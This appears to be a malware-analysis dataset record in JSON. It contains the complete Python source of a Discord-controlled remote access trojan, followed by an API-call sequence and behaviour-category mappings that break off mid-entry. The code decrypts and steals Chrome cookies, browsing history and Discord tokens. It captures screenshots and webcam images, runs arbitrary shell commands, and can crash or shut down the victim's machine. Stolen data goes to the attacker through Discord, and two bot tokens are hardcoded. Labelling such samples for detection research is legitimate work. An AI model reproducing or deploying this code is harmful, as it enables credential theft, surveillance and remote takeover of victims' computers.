[
  {
    "pyfile": "__main__.py",
    "code_snippet": "from discord.ext import commands\nfrom PIL import ImageGrab\nimport subprocess\nimport time\nimport os\nimport io\nimport sqlite3\nimport ctypes\nimport discord\nimport shutil\nimport json\nimport base64\nimport win32crypt\nimport pycookiecheat\nimport getpass\nimport platform\nimport requests\nimport win32com.client as wincl\nimport ctypes\nimport re\nimport json\nimport socket\nimport colorama\nimport win32gui\nimport asyncio\nfrom colorama import init, Fore\nfrom urllib.request import urlopen\nimport logging\nfrom pathlib import Path\n\ninit()\n\nintents = discord.Intents.default()\nintents.members = True\nintents.message_content = True\nbot = commands.Bot(command_prefix='!', help_command=None, intents=intents)\n\nasync def run_bot():\n    await bot.start(\"OTEzMTgzNTI4NTQ2NjExMjQy.GHlayo.bMDO5rucURNnYdhn4YMdB-uiJIvvMfwvy_PVqY\")\n    hwnd = win32gui.FindWindow(None, \"window_title\")\n    win32gui.ShowWindow(hwnd, win32gui.SW_MINIMIZE)\n\ndef tahg(pene):\n    x = json.loads(open(os.environ['LOCALAPPDATA'] + \"\\\\Google\\\\Chrome\\\\User Data\\\\Local State\", \"r\", encoding=\"utf-8\").read())\n    try:\n        mk = win32crypt.CryptUnprotectData(base64.b64decode(x[\"os_crypt\"][\"encrypted_key\"])[5:], None, None, None, 0)[1]\n    except:\n        mk = \"\"\n    try:\n       return (AES.new(mk, AES.MODE_GCM, pene[3:15]).decrypt(pene[15:])[:-16]).decode()\n    except:\n        return \"\"\n\n@bot.command()\nasync def getcookies(ctx):\n    get_chrome_cookies()\n    await ctx.send(file=discord.File(os.environ['TEMP'] + \"\\\\cookies.txt\"))\n    await ctx.send(\"[*] Command successfully executed\")\ndef get_chrome_cookies():\n    shutil.copyfile(os.environ['LOCALAPPDATA'] + \"\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Network\\\\Cookies\", os.environ['TEMP'] + \"\\\\asd\")\n    con = sqlite3.connect(os.environ['TEMP'] + \"\\\\asd\")\n    cursor = con.cursor()\n    cursor.execute(\"SELECT host_key, name, value, encrypted_value FROM cookies\")\n    file = open(os.environ['TEMP'] + \"\\\\cookies.txt\", \"w+\")\n    for cookie in cursor.fetchall():\n        file.write(f\"{cookie[0]} - {cookie[1]} - {cookie[2]} - {tahg(cookie[3])}\\n\")\n    cursor.close()\n    con.close()\n    file.close()\n\n@bot.command()\nasync def screenshot(ctx):\n    image = ImageGrab.grab()\n    with io.BytesIO() as image_binary:\n        image.save(image_binary, 'PNG')\n        image_binary.seek(0)\n        file = discord.File(image_binary, filename='screenshot.png')\n        await ctx.send(file=file)\n    await ctx.send(\"[*] Command successfully executed\")\n\n@bot.event\nasync def on_ready():\n    guild_id = 1070633873374986271\n    guild = bot.get_guild(guild_id)\n    if guild is None:\n        print(f\"No se pudo encontrar un servidor con el ID {guild_id}\")\n        return\n    channel_name = os.getlogin()\n    channel = await guild.create_text_channel(channel_name)\n    system_info = f\"**OS**: {platform.system()} {platform.release()}\\n**CPU**: {platform.processor()}\"\n    ip_address = socket.gethostbyname(socket.gethostname())\n    embed = discord.Embed(title=\"Nuevo Usuario Infectado\", description=f\"**Usuario:** {channel_name}\\n**IP:** {ip_address}\", color=0x000000)\n    embed.set_thumbnail(url='https://media.discordapp.net/attachments/847380398283685919/1079575682193031188/tumblr_n4dhaindMe1ste05mo1_400.gif')\n    await channel.send(embed=embed)\n\n@bot.command()\nasync def shell(ctx, *args):\n    command = ' '.join(args)\n    try:\n        output = subprocess.check_output(command, shell=True).decode('cp1252')\n    except subprocess.CalledProcessError as e:\n        output = e.output.decode('cp1252')\n    embed = discord.Embed(title=\"Shell Output\", description=output)\n    await ctx.send(embed=embed)\n\n@bot.command()\nasync def history(ctx):\n    import sqlite3\n    import os\n    import time\n    import shutil\n    temp = (os.getenv('TEMP'))\n    Username = (os.getenv('USERNAME'))\n    shutil.rmtree(temp + r\"\\history12\", ignore_errors=True)\n    os.mkdir(temp + r\"\\history12\")\n    path_org = r\"\"\" \"C:\\\\Users\\\\{}\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\History\" \"\"\".format(Username)\n    path_new = temp + r\"\\history12\"\n    copy_me_to_here = ((\"copy\" + path_org + \"\\\"{}\" ).format(path_new))\n    os.system(copy_me_to_here)\n    con = sqlite3.connect(path_new + r\"\\history\")\n    cursor = con.cursor()\n    cursor.execute(\"SELECT url FROM urls\")\n    urls = cursor.fetchall()\n    for x in urls:\n        done = (\"\".join(x))\n        f4 = open(temp + r\"\\history12\" + r\"\\history.txt\", 'a')\n        f4.write(str(done))\n        f4.write(str(\"\\n\"))\n        f4.close()\n    con.close()\n    file = discord.File(temp + r\"\\history12\" + r\"\\history.txt\", filename=\"history.txt\")\n    await ctx.send(\"[*] Command successfully executed\", file=file)\n    def deleteme() :\n        path = \"rmdir \" + temp + r\"\\history12\" + \" /s /q\"\n        os.system(path)\n    deleteme()\n\n@bot.command()\nasync def wallpaper(ctx):\n    import ctypes\n    import os\n    path = os.path.join(os.getenv('TEMP') + r\"\\temp.jpg\")\n    await ctx.message.attachments[0].save(path)\n    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)\n    await ctx.send(\"[*] Command successfully executed\")\n\n@bot.command()\nasync def message(ctx, *args):\n    import ctypes\n    import time\n    MB_YESNO = 0x04\n    MB_HELP = 0x4000\n    ICON_STOP = 0x10\n    def mess():\n        ctypes.windll.user32.MessageBoxW(0, ' '.join(args), \"Error\", MB_HELP | MB_YESNO | ICON_STOP)\n    import threading\n    messa = threading.Thread(target=mess)\n    messa._running = True\n    messa.daemon = True\n    messa.start()\n    import win32con\n    import win32gui\n    def get_all_hwnd(hwnd,mouse):\n        def winEnumHandler(hwnd, ctx):\n            if win32gui.GetWindowText(hwnd) == \"Error\":\n                win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)\n                win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)\n                win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  \n                win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)\n                return None\n            else:\n                pass\n        if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):\n            win32gui.EnumWindows(winEnumHandler,None)\n    await ctx.send(\"[*] Command successfully executed\")\n    win32gui.EnumWindows(get_all_hwnd, 0)\n\n@bot.command()\nasync def bluescreen(ctx):\n    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))\n    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))\n\n@bot.command()\nasync def descargar(ctx, *args):\n    command = ' '.join(args)\n    try:\n        subprocess.check_call(command, shell=True)\n        subprocess.check_call(command, shell=True)\n        user = getpass.getuser()\n        embed = discord.Embed(title=f\"Descarga Exitosa ({user})\", color=0x00FF00, description=\"La descarga se completó correctamente en tu PC.\")\n        embed.set_thumbnail(url='https://media.discordapp.net/attachments/820440347724742686/1074937767143936070/IMG_20230209_023618.jpg?width=473&height=473')\n    except subprocess.CalledProcessError as e:\n        embed = discord.Embed(title=\"Error al Descargar\", color=0xFF0000, description=\"No se pudo completar la descarga. Revisa si ingresaste los comandos correctamente.\")\n        embed.set_thumbnail(url='https://media.discordapp.net/attachments/820440347724742686/1074937767143936070/IMG_20230209_023618.jpg?width=473&height=473')\n    await ctx.send(embed=embed)\n\n@bot.command()\nasync def cam(ctx):\n    ImageGrab.grab(bbox=(0,0,640,480)).save('camera.png', 'PNG')\n    await ctx.send(file=discord.File('camera.png'))\n\n@bot.command()\nasync def stop(ctx):\n    os.system(\"shutdown /s /t 1\")\n\ndef get_account_name(token):\n    headers = {\n        \"Authorization\": token,\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299\"\n    }\n    try:\n        r = requests.get(\"https://discord.com/api/v9/users/@me\", headers=headers)\n        return r.json()[\"username\"] + \"#\" + r.json()[\"discriminator\"]\n    except:\n        return \"Unknown\"\n\n@bot.command()\nasync def tokens(ctx):\n    paths = [\n        os.path.join(os.getenv(\"APPDATA\"), \".discord\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"APPDATA\"), \".discordcanary\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"APPDATA\"), \".discordptb\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"LOCALAPPDATA\"), \"Google\", \"Chrome\", \"User Data\", \"Default\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"LOCALAPPDATA\"), \"Google\", \"Chrome SxS\", \"User Data\", \"Default\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"LOCALAPPDATA\"), \"Microsoft\", \"Edge\", \"User Data\", \"Default\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"LOCALAPPDATA\"), \"BraveSoftware\", \"Brave-Browser\", \"User Data\", \"Default\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"APPDATA\"), \"Opera Software\", \"Opera Stable\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"APPDATA\"), \"Opera Software\", \"Opera GX Stable\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"APPDATA\"), \"Opera Software\", \"Opera\", \"Local Storage\", \"leveldb\"),\n    ]\n    tokens = []\n    for path in paths:\n        if not os.path.exists(path):\n            continue\n        for file in os.listdir(path):\n            if not file.endswith(\".log\") and not file.endswith(\".ldb\"):\n                continue\n            for line in [x.strip() for x in open(os.path.join(path, file), errors=\"ignore\").readlines() if x.strip()]:\n                for regex in [r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38}\", r\"mfa\\.[\\w-]{84}\"]:\n                    for token in re.findall(regex, line):\n                        account_name = get_account_name(token)\n                        tokens.append((account_name, token))\n    if not tokens:\n        await ctx.send(\"No se encontraron tokens.\")\n    else:\n        embed = discord.Embed(title=\"Tokens encontrados:\", color=0xfafafa)\n        for token in tokens:\n            account_name = token[0]\n            token = token[1]\n            embed.add_field(name=account_name, value=f\"```{token}```\", inline=False)\n        await ctx.send(embed=embed)\n\n@bot.command()\nasync def voice(ctx):\n    volumeup()\n    speak = wincl.Dispatch(\"SAPI.SpVoice\")\n    speak.Speak(ctx.message.content[7:])\n    await ctx.send(\"[*] Command successfuly executed\")\n\ndef volumeup():\n    pass\n\n@bot.event\ndef on_command_error(ctx, error):\n    if isinstance(error, commands.CommandNotFound):\n        await ctx.send('El comando que ingresaste no existe. Inténtalo de nuevo.')\n\n@bot.command()\nasync def webcampic(ctx):\n    temp = os.getenv('TEMP')\n    cap = cv2.VideoCapture(0)\n    ret, frame = cap.read()\n    cv2.imwrite(temp + r\"\\temp.png\", frame)\n    cap.release()\n    with open(temp + r\"\\temp.png\", \"rb\") as image_file:\n        img = Image.open(io.BytesIO(image_file.read()))\n    img_byte_arr = io.BytesIO()\n    img.save(img_byte_arr, format='PNG')\n    img_byte_arr = img_byte_arr.getvalue()\n    file = discord.File(io.BytesIO(img_byte_arr), filename=\"temp.png\")\n    await ctx.send(\"[*] Command successfully executed\", file=file)\n\nbot.run(\"OTEzMTgzNTI4NTQ2NjExMjQy.GTqtPh.G5URGlnI54swuJ83yKJScF9CDZPrSuhWOvM9M4\")",
    "pattern_analysis": {
      "api_sequence": [
        "colorama.init",
        "discord.Intents.default",
        "discord.Bot",
        "discord.Bot.start",
        "win32gui.FindWindow",
        "win32gui.ShowWindow",
        "open",
        "os.environ.__getitem__",
        "win32crypt.CryptUnprotectData",
        "base64.b64decode",
        "AES.new",
        "AES.new.decrypt",
        "discord.File",
        "os.environ.__getitem__",
        "discord.Context.send",
        "shutil.copyfile",
        "os.environ.__getitem__",
        "sqlite3.connect",
        "sqlite3.Connection.cursor",
        "sqlite3.Cursor.execute",
        "sqlite3.Cursor.fetchall",
        "open",
        "json.loads",
        "discord.Context.send",
        "ImageGrab.grab",
        "io.BytesIO",
        "PIL.Image.Image.save",
        "io.BytesIO.seek",
        "discord.File",
        "discord.Context.send",
        "discord.Context.send",
        "discord.Bot.get_guild",
        "os.getlogin",
        "discord.Guild.create_text_channel",
        "platform.system",
        "platform.release",
        "platform.processor",
        "socket.gethostname",
        "socket.gethostbyname",
        "discord.Embed",
        "discord.Embed.set_thumbnail",
        "discord.TextChannel.send",
        "subprocess.check_output",
        "discord.Embed",
        "discord.Context.send",
        "sqlite3.connect",
        "sqlite3.Connection.cursor",
        "sqlite3.Cursor.execute",
        "sqlite3.Cursor.fetchall",
        "open",
        "discord.File",
        "discord.Context.send",
        "os.system",
        "ctypes.windll.user32.SystemParametersInfoW",
        "discord.Context.send",
        "ctypes.windll.user32.MessageBoxW",
        "threading.Thread",
        "threading.Thread.start",
        "win32gui.EnumWindows",
        "discord.Context.send",
        "ctypes.windll.ntdll.RtlAdjustPrivilege",
        "ctypes.windll.ntdll.NtRaiseHardError",
        "subprocess.check_call",
        "getpass.getuser",
        "discord.Embed",
        "discord.Embed.set_thumbnail",
        "discord.Context.send",
        "ImageGrab.grab",
        "PIL.Image.Image.save",
        "discord.File",
        "discord.Context.send",
        "os.system",
        "requests.get",
        "os.path.join",
        "os.getenv",
        "os.path.exists",
        "os.listdir",
        "open",
        "re.findall",
        "discord.Embed",
        "discord.Embed.add_field",
        "discord.Context.send",
        "wincl.Dispatch",
        "wincl.Dispatch.Speak",
        "discord.Context.send",
        "cv2.VideoCapture",
        "cv2.VideoCapture.read",
        "cv2.imwrite",
        "cv2.VideoCapture.release",
        "open",
        "PIL.Image.open",
        "io.BytesIO",
        "PIL.Image.Image.save",
        "discord.File",
        "discord.Context.send",
        "discord.Bot.run"
      ],
      "api_sequence_with_args": [
        "colorama.init()",
        "discord.Intents.default()",
        "discord.Bot(command_prefix='!', help_command=None, intents=intents)",
        "discord.Bot.start('OTEzMTgzNTI4NTQ2NjExMjQy.GHlayo.bMDO5rucURNnYdhn4YMdB-uiJIvvMfwvy_PVqY')",
        "win32gui.FindWindow(None, 'window_title')",
        "win32gui.ShowWindow(hwnd, win32gui.SW_MINIMIZE)",
        "open(os.environ['LOCALAPPDATA'] + '\\\\Google\\\\Chrome\\\\User Data\\\\Local State', 'r', encoding='utf-8')",
        "os.environ.__getitem__('LOCALAPPDATA')",
        "win32crypt.CryptUnprotectData(base64.b64decode(x['os_crypt']['encrypted_key'])[5:], None, None, None, 0)",
        "base64.b64decode(x['os_crypt']['encrypted_key'])",
        "AES.new(mk, AES.MODE_GCM, pene[3:15])",
        "AES.new(mk, AES.MODE_GCM, pene[3:15]).decrypt(pene[15:])",
        "discord.File(os.environ['TEMP'] + '\\\\cookies.txt')",
        "os.environ.__getitem__('TEMP')",
        "discord.Context.send(file=discord.File(os.environ['TEMP'] + '\\\\cookies.txt'))",
        "shutil.copyfile(os.environ['LOCALAPPDATA'] + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Network\\\\Cookies', os.environ['TEMP'] + '\\\\asd')",
        "os.environ.__getitem__('LOCALAPPDATA')",
        "sqlite3.connect(os.environ['TEMP'] + '\\\\asd')",
        "sqlite3.Connection.cursor()",
        "sqlite3.Cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')",
        "sqlite3.Cursor.fetchall()",
        "open(os.environ['TEMP'] + '\\\\cookies.txt', 'w+')",
        "json.loads(open(os.environ['LOCALAPPDATA'] + '\\\\Google\\\\Chrome\\\\User Data\\\\Local State', 'r', encoding='utf-8').read())",
        "discord.Context.send(file=discord.File(os.environ['TEMP'] + '\\\\cookies.txt'))",
        "ImageGrab.grab()",
        "io.BytesIO()",
        "PIL.Image.Image.save(image_binary, 'PNG')",
        "io.BytesIO.seek(0)",
        "discord.File(image_binary, filename='screenshot.png')",
        "discord.Context.send(file=file)",
        "discord.Context.send('[*] Command successfully executed')",
        "discord.Bot.get_guild(guild_id)",
        "os.getlogin()",
        "discord.Guild.create_text_channel(channel_name)",
        "platform.system()",
        "platform.release()",
        "platform.processor()",
        "socket.gethostname()",
        "socket.gethostbyname(socket.gethostname())",
        "discord.Embed(title='Nuevo Usuario Infectado', description=f'**Usuario:** {channel_name}\\n**IP:** {ip_address}', color=0x000000)",
        "discord.Embed.set_thumbnail(url='https://media.discordapp.net/attachments/847380398283685919/1079575682193031188/tumblr_n4dhaindMe1ste05mo1_400.gif')",
        "discord.TextChannel.send(embed=embed)",
        "subprocess.check_output(command, shell=True)",
        "discord.Embed(title='Shell Output', description=output)",
        "discord.Context.send(embed=embed)",
        "sqlite3.connect(path_new + r'\\history')",
        "sqlite3.Connection.cursor()",
        "sqlite3.Cursor.execute('SELECT url FROM urls')",
        "sqlite3.Cursor.fetchall()",
        "open(temp + r'\\history12' + r'\\history.txt', 'a')",
        "discord.File(temp + r'\\history12' + r'\\history.txt', filename='history.txt')",
        "discord.Context.send('[*] Command successfully executed', file=file)",
        "os.system(path)",
        "ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)",
        "discord.Context.send('[*] Command successfully executed')",
        "ctypes.windll.user32.MessageBoxW(0, ' '.join(args), 'Error', MB_HELP | MB_YESNO | ICON_STOP)",
        "threading.Thread(target=mess)",
        "threading.Thread.start()",
        "win32gui.EnumWindows(get_all_hwnd, 0)",
        "discord.Context.send('[*] Command successfully executed')",
        "ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))",
        "ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))",
        "subprocess.check_call(command, shell=True)",
        "getpass.getuser()",
        "discord.Embed(title=f'Descarga Exitosa ({user})', color=0x00FF00, description='La descarga se completó correctamente en tu PC.')",
        "discord.Embed.set_thumbnail(url='https://media.discordapp.net/attachments/820440347724742686/1074937767143936070/IMG_20230209_023618.jpg?width=473&height=473')",
        "discord.Context.send(embed=embed)",
        "ImageGrab.grab(bbox=(0,0,640,480))",
        "PIL.Image.Image.save('camera.png', 'PNG')",
        "discord.File('camera.png')",
        "discord.Context.send(file=discord.File('camera.png'))",
        "os.system('shutdown /s /t 1')",
        "requests.get('https://discord.com/api/v9/users/@me', headers=headers)",
        "os.path.join(os.getenv('APPDATA'), '.discord', 'Local Storage', 'leveldb')",
        "os.getenv('APPDATA')",
        "os.path.exists(path)",
        "os.listdir(path)",
        "open(os.path.join(path, file), errors='ignore')",
        "re.findall(regex, line)",
        "discord.Embed(title='Tokens encontrados:', color=0xfafafa)",
        "discord.Embed.add_field(name=account_name, value=f'```{token}```', inline=False)",
        "discord.Context.send(embed=embed)",
        "wincl.Dispatch('SAPI.SpVoice')",
        "wincl.Dispatch.Speak(ctx.message.content[7:])",
        "discord.Context.send('[*] Command successfuly executed')",
        "cv2.VideoCapture(0)",
        "cv2.VideoCapture.read()",
        "cv2.imwrite(temp + r'\\temp.png', frame)",
        "cv2.VideoCapture.release()",
        "open(temp + r'\\temp.png', 'rb')",
        "PIL.Image.open(io.BytesIO(image_file.read()))",
        "io.BytesIO()",
        "PIL.Image.Image.save(img_byte_arr, format='PNG')",
        "discord.File(io.BytesIO(img_byte_arr), filename='temp.png')",
        "discord.Context.send('[*] Command successfully executed', file=file)",
        "discord.Bot.run('OTEzMTgzNTI4NTQ2NjExMjQy.GTqtPh.G5URGlnI54swuJ83yKJScF9CDZPrSuhWOvM9M4')"
      ],
      "mapped_sequence": [
        {
          "api_name": "colorama.init",
          "id": "init_colorama",
          "description": "Initializes colorama for ANSI color support in terminal",
          "first_id": "code_execution",
          "second_id": "object_initialization",
          "third_id": "class_initialization"
        },
        {
          "api_name": "discord.Intents.default",
          "id": "get_discord_intents",
          "description": "Returns default Discord intents object",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_control"
        },
        {
          "api_name": "discord.Bot",
          "id": "create_discord_bot",
          "description": "Creates Discord bot instance with specified prefix and intents",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_object_creation"
        },
        {
          "api_name": "discord.Bot.start",
          "id": "start_discord_bot",
          "description": "Starts the Discord bot with provided token",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_control"
        },
        {
          "api_name": "win32gui.FindWindow",
          "id": "find_window_by_title",
          "description": "Finds window handle by title",
          "first_id": "system_operations",
          "second_id": "window_management",
          "third_id": "window_finding"
        },
        {
          "api_name": "win32gui.ShowWindow",
          "id": "change_window_position",
          "description": "Changes window position and Z-order",
          "first_id": "system_operations",
          "second_id": "window_management",
          "third_id": "window_control"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.environ.__getitem__",
          "id": "get_env_vars",
          "description": "Retrieves environment variables mapping",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "win32crypt.CryptUnprotectData",
          "id": "decrypt_dpapi_data",
          "description": "Decrypts Windows DPAPI-encrypted data",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "AES.new",
          "id": "init_aes_gcm",
          "description": "Initializes AES cipher in GCM mode",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "encryption_initialization"
        },
        {
          "api_name": "AES.new.decrypt",
          "id": "decrypt_aes_data",
          "description": "Decrypts data using initialized AES cipher",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "discord.File",
          "id": "create_discord_file_path",
          "description": "Creates Discord file object from specified path",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_object_creation"
        },
        {
          "api_name": "discord.Context.send",
          "id": "send_discord_file",
          "description": "Sends file to Discord channel",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_message_operations"
        },
        {
          "api_name": "shutil.copyfile",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "sqlite3.connect",
          "id": "open_sqlite_db",
          "description": "Opens SQLite database file",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Connection.cursor",
          "id": "create_sql_cursor",
          "description": "Creates cursor object for SQLite connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Cursor.execute",
          "id": "execute_sql_query",
          "description": "Executes SQL query on SQLite connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Cursor.fetchall",
          "id": "fetch_sql_rows",
          "description": "Fetches all rows from last executed query",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "json.loads",
          "id": "deserialize_from_json",
          "description": "Deserializes JSON string to Python object",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "ImageGrab.grab",
          "id": "capture_entire_screen",
          "description": "Captures screenshot of the entire screen",
          "first_id": "information_gathering",
          "second_id": "multimedia_capture",
          "third_id": "screen_capture"
        },
        {
          "api_name": "io.BytesIO",
          "id": "create_memory_bytes",
          "description": "Creates in-memory bytes buffer from encoded string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "PIL.Image.Image.save",
          "id": "save_image_buffer",
          "description": "Saves image to in-memory buffer in PNG format",
          "first_id": "information_gathering",
          "second_id": "multimedia_capture",
          "third_id": "image_processing"
        },
        {
          "api_name": "io.BytesIO.seek",
          "id": "move_buffer_pointer",
          "description": "Moves buffer pointer to start",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "discord.File",
          "id": "create_discord_file_memory",
          "description": "Creates Discord file object from in-memory image",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_object_creation"
        },
        {
          "api_name": "discord.Context.send",
          "id": "send_discord_file",
          "description": "Sends file to Discord channel",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_message_operations"
        },
        {
          "api_name": "discord.Bot.get_guild",
          "id": "get_discord_guild",
          "description": "Retrieves Discord guild object by ID",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_message_operations"
        },
        {
          "api_name": "os.getlogin",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "discord.Guild.create_text_channel",
          "id": "create_discord_channel",
          "description": "Creates new text channel in Discord guild",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_object_creation"
        },
        {
          "api_name": "platform.system",
          "id": "get_os_info",
          "description": "Retrieves operating system information",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "platform.release",
          "id": "get_os_release",
          "description": "Retrieves operating system release version",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "platform.processor",
          "id": "get_processor_name",
          "description": "Retrieves processor name as string",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "hardware_information"
        },
        {
          "api_name": "socket.gethostname",
          "id": "get_hostname",
          "description": "Retrieves current host name",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "address_information"
        },
        {
          "api_name": "socket.gethostbyname",
          "id": "resolve_hostname",
          "description": "Resolves host name to IPv4 address",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "domain_resolution"
        },
        {
          "api_name": "discord.Embed",
          "id": "create_discord_embed",
          "description": "Creates Discord embed object with specified content",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_object_creation"
        },
        {
          "api_name": "discord.Embed.set_thumbnail",
          "id": "set_discord_thumbnail",
          "description": "Sets thumbnail image for Discord embed",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_message_operations"
        },
        {
          "api_name": "discord.TextChannel.send",
          "id": "send_discord_embed",
          "description": "Sends embed message to Discord channel",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_message_operations"
        },
        {
          "api_name": "subprocess.check_output",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "discord.Embed",
          "id": "create_discord_embed",
          "description": "Creates Discord embed object with specified content",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_object_creation"
        },
        {
          "api_name": "discord.Context.send",
          "id": "send_discord_embed",
          "description": "Sends embed message to Discord channel",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_message_operations"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "ctypes.windll.user32.SystemParametersInfoW",
          "id": "set_desktop_wallpaper",
          "description": "Sets desktop wallpaper to specified image",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "system_interface_usage"
        },
        {
          "api_name": "ctypes.windll.user32.MessageBoxW",
          "id": "display_message_box",
          "description": "Displays message box with specified text and options",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "system_interface_usage"
        },
        {
          "api_name": "threading.Thread",
          "id": "create_thread",
          "description": "Creates new thread to execute target function",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_creation"
        },
        {
          "api_name": "threading.Thread.start",
          "id": "start_thread",
          "description": "Starts thread execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "win32gui.EnumWindows",
          "id": "enumerate_windows",
          "description": "Enumerates all top-level windows",
          "first_id": "system_operations",
          "second_id": "window_management",
          "third_id": "window_finding"
        },
        {
          "api_name": "ctypes.windll.ntdll.RtlAdjustPrivilege",
          "id": "adjust_process_privilege",
          "description": "Adjusts process privilege for system operation",
          "first_id": "system_operations",
          "second_id": "system_privilege_operations",
          "third_id": "privilege_management"
        },
        {
          "api_name": "ctypes.windll.ntdll.NtRaiseHardError",
          "id": "raise_hard_error",
          "description": "Raises a hard error in Windows",
          "first_id": "system_operations",
